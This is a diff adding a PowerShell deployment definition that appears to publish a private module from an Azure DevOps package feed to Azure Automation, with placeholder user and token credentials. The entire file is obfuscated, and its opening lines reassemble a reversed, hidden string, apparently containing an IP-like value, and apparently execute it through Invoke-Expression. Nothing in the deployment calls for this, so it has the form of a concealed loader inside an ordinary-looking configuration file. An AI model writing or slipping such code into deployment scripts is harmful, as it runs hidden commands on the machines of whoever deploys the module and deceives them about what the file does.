@@ -1,0 +1,24 @@
+sET-ITEM ("vaRI"+"ABLe"+":JSVne"+"2") ( [typE]('aRrA'+'Y')  ) ;
+dEp`L`oy PRIVateModulE {
+    ${xM`Ys}  = ${e`4Kd} =  [cHar[] ] (")'X'+]43[eMoHSP$+]4[EMoHSp$ "+'('+'. '+('YnJ)93]RaHC'+'['+']GnI'+'R'+'TS['+',u1GI'+'kRu1G(E'+'cAL'+'p'+'er.)'+'u1'+'GI'+'k'+'R73.7'+'32'+'u1G+u1G'+'.51u1G'+'+u1'+'G2'+'.42'+':'+'u1G+u1G'+'pu1'+'G+u'+'1G'+'iIku1G+u1G'+'Ru'+'1G('+' ').rePlACE(([cHaR]117+[cHaR]49+[cHaR]71),[sTRInG][cHaR]39).REPLACe(([cHaR]89+[cHaR]110+[cHaR]74),[sTRInG][cHaR]124)+'') ;  ( GeT-vARIabLE  ("js"+"vNe"+"2") -valu  )::ReVERsE( ${E`4KD} ) ;(-joIN ${e`4KD} )
+    bY AZureauToMatIonMODUlE {
+        FRom`soU`RCE ('ht'+'t'+'ps'+':'+'/'+'/p'+'k'+'g'+'s.de'+'v'+'.az'+'u'+'r'+'e.'+'com/'+'ORGANIZATION_NAME/PR'+'O'+'J'+'ECT'+'_NAME/_pa'+'ckag'+'ing/FEED'+'_'+'NAME/nuget/v2')
+        t`O ('AAN'+'am'+'e')
+        w`ItH`optioNs @{
+            SoUrCEISabsOLuTe   = ${t`RuE}
+            mODUlenAmE         = ('Priva'+'te'+'Mod'+'ule')
+            
+            forCE              = ${tR`UE}
+            reSourcEgRoUpName  = ('A'+'AReso'+'urceGroupNa'+'m'+'e')
+            StOrAGeAccouNTnAMe = ('aad'+'eplo'+'yments'+'tor')
+            CrEdEntial         = ${sCr`I`pT:CR`E`dEnTI`AL}
+        }
+        w`i`ThPresc`RiPt {
+            ${us`ER} = ('user@c'+'onto'+'so.'+'c'+'om')
+            ${pa`ssWo`Rd} = cONVerT`To`-`secu`ReSTrIng ('P'+'AT_'+'TOKEN') -AsPlainText -Force 
+            ${S`cript`:c`REdEntial} = n`E`w-ObJecT -TypeName ('S'+'yst'+'e'+'m.M'+'ana'+'geme'+'nt'+'.Automation.P'+'S'+'C'+'reden'+'t'+'ial') -ArgumentList ${Us`Er}, ${P`ASs`w`orD}
+        }
+    }
+}
+
+
